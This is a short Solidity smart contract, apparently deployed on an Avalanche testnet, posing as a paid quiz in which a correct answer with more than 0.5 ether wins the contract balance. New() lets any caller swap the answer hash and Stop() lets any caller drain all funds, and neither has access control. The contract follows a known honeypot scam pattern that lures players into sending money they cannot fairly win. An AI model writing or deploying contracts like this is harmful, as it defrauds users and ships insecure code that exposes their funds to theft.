/**
 *Submitted for verification at testnet.snowtrace.io on 2022-06-16
*/

contract uni_quiz
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);
        require(responseHash == keccak256(abi.encode(_response)) && msg.value > 0.5 ether, "");
        payable(msg.sender).transfer(address(this).balance);
      
    }

    bytes32 public responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string calldata _response) public payable {
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
        }
    }

    function New(bytes32 _responseHash) public payable {
        responseHash = _responseHash;
    }

    function Stop() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external {}
}